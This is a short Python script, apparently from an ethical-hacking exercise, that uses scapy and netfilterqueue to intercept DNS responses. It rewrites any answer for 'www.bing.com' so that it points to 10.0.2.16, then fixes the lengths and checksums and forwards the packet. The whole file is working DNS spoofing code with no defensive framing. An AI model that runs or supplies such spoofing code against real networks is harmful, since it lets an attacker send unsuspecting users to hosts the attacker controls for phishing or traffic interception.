#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Aug 15 11:41:17 2020

@author: djmaan
"""


import scapy.all as scapy
import netfilterqueue

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # print(scapy_packet.show())
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname = qname, rdata = "10.0.2.16")
            scapy_packet[scapy.DNS].an = answer 
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(str(scapy_packet))
            
    packet.accept()
    
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()